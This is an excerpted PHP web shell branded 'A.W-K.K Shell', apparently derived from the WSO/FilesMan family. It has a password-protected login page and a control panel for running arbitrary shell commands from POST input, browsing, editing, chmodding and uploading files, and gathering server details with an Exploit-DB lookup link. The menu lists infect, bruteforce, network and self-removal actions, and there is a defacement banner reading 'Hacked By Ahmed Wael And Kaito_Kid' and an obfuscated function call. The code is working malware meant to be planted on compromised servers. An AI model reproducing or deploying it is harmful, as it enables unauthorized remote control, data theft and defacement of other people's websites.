...
.login {
	background: linear-gradient(silver , black  , black);
  position: relative;
  height: 560px;
  width: 405px;
  margin: auto;
  padding: 60px 60px;
  background-color:black; no-repeat   center center #505050;   
  background-size: cover;
...
.button {
  background:linear-gradient(gold , gold , silver , silver , gold , gold , silver , silver , gold  , gold , silver , silver , gold , gold , silver , silver) ;
  color: #333;
  width: 200px;
  padding: 10px 20px;
  display: block;
...
.button:hover {
    background:linear-gradient(silver , silver , gold , gold , silver , silver , gold , gold , silver  , silver , gold , gold , silver , silver , gold , gold) ;
    box-shadow: 0px 4px 35px -5px blue;
  cursor: pointer;
}
...
.sign{
	color: gold;
    background: linear-gradient(#A0A0A0, black , #A0A0A0  , black);
}
	</style>

</head>
<body>
<img class='im1' align='left' src='https://l.top4top.io/p_2230s1zjz1.png' />
<img class='im1' align='right' src='https://b.top4top.io/p_2230mxb601.png' />
<link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
<div class='login'>
  <center>
  <img class='im2' src='https://l.top4top.io/p_2230klo9n1.png' />
  <h2 class='sign'>{  Login to shell  } </h2></center>
		<form method=post>
		<center><input class='text' type=password name=pass placeholder='Password' required='required'>   
    
     <input class='button' type=submit name='watching' value='submit'></center>
 </form>
</div>
</body>
</html>
...
function hardHeader() {
	...
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " A.W-K.K Shell " . "v1.0" ."</title>
	<script>

	</script>
<style>
	body {background-image:url('https://e.top4top.io/p_2014ucwt21.gif'); color: white; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } 
	canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 50%; height: 100px; background-image: url('https://e.top4top.io/p_2014ucwt21.gif'); background-image: url('https://e.top4top.io/p_2014ucwt21.gif'); background-size: 0% background-repeat: no-repeat; background-size: cover; background-position: 100% 100%;}
	...
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:blue;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	...
	.main th	{text-align:left;background:linear-gradient( silver , #333 , gold);}

	.main tr:hover{background:linear-gradient(blue , green);}

	.main td, th{vertical-align:middle;}

	.l1			{background:linear-gradient( white ,black , white);}
</style>
<script>
...
$v($x.$i.$l.$v.$o,$z,$h);
	...
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a class='go' href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	...
	$m = array('SecInfo'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['▛']))
	$m['Logout'] = 'Logout';
	$m['Shell remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th>[ <a class="go" href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if (is_dir($drive.':\\'))
			$drives .= '<a class="go" href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	/* (С) 08.2015 dmkcv */
	echo '
	<style>
...
<div class="glitch">
	...
	<img class="image"  align=left src=https://b.top4top.io/p_2230mxb601.png />
	<img class="image"  align=center src=https://e.top4top.io/p_2230i2v6x1.png />
	<img class="image"  align=right src="https://l.top4top.io/p_2230s1zjz1.png"/>
		</div>
	...
	<br>Php:
	<br>Hdd:
	<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span>
	</td>'.
		 '<td>
		 <nobr><div class="di">'.substr(@php_uname(), 0, 120).'
		  <a class="go" href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a>
		   <a class="go" href="'.$explink.'" target=_blank>[ Exploit-DB ]</a>
		   </nobr>
		   <br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>
		   '.@phpversion().' <span>Safe mode:</span> 
		   '.($GLOBALS['safe_mode']?'
		   	<font color=green>ON</font>':'<font color=red><b>OFF</b></font>').
		   ' <a class="go" href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a class="go" href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br>
		 <span style="background-color: #333;">Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span style="background-color: #333; color= red;">Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</div></nobr></div>

		 </td></tr></table>'.
		 '<table class="go" style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='red'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<style>
...
.glitch
  {
    ...
    width: 100%;
    height: 100vh;
    background: url(https://b.top4top.io/p_2230zj4yn1.gif);
    background-size: cover;
  }
...
<!---start <tr> number 1--->
	<tr>
	<!-------Start Form << Change Dir >>------->
		<td>
		<form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\">
		<span style='color:red;'>Change dir:</span>
		<input type='password' class='text' name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><br>
		<input id='but' type=submit value='submit'>
		</form>
		</td>
		<!--------End Form << Change Dir >>--------->
		<!--------Start Form << Read File >>------->
		<td>
		<form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\">
		<span>Read file:</span>
		<input id='inp' type=text name=f required><br>
		<input id='but' type=submit value='submit'></form>
		</td>
	</tr>
<!---end <tr> number 1---->
<!---start <tr> number 2------>
	<tr>
		<td>
		<form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\">
		<span>Make dir:</span>
		<input id='inp' type=text name=d required><br>
		<input id='but' type=submit value='submit'>
		</form></td>
		<td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\">
		<span>Make file:</span>
		<input id='inp' type=text name=f required><br>
		<input id='but' type=submit value='submit'></form></td>
	</tr>
<!----end <tr> number 2----->
	<tr>
		<td>
		<form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span>
		<input id='inp' type=text name=c value=''><br>
		<input id='but' type=submit value='submit'></form></td>
		...
		<input id='inp' type=file name=f[]  multiple><br>
		<input id='but' type=submit value='submit'></form><br></td>
	</tr></table></div>
...
.se{
	...
	<h1 class=se>Server security information</h1><div class=content>';
...
.sp{
	...
	<span class="sp">Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	...
	foreach($m as $v)
		echo '<a class="go" href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
		...
		case 'chmod':
			...
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input id="but" type=submit value="submit"></form>';
			break;
		case 'edit':
			...
			echo '</textarea><input id="but" type=submit value="submit"></form>';
			break;
		case 'hexdump':
		...
		case 'rename':
			...
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input id="but" type=submit value="submit"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
			...
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input id="but" type=submit value="submit"></form>';
			break;
		/* (С) 12.2015 mitryz */
		case 'frame':
...
";
	echo '<h1>Console Terminal </h1><div class=te><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
	...
	echo '</select></label><input  type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr>
	<input class="te" type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/>
	<textarea class=t name=output style="border-bottom:0;margin-top:5px;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
	}
	echo '</textarea><table class="te"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
...
function actionFilesMan() {
	...
	<h1 class=fm>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
...
<form name=files method=post><tr><th width='13px'>
<input type=checkbox onclick='sa()' style='border:2px dotted #00f;display:block;background:#ff0000;'>
</th><th>
<a class='name' href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a>
</th><th>
<a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a>
</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a>
</th><th>Owner/Group</th><th>
<a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a>
</th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
...
<script>
alert("Hacked By Ahmed Wael And Kaito_Kid");
</script>
		<body>
		<h1 class=y><center>Hacked By Ahmed Wael And Kaito-Kid
		By !
		</h1></center></body>
		');
}
...
function actionInfect() {
	...
	<h1 class=inf>Infect</h1><div class=content>';
	if($_POST['p1'] == 'infect') {
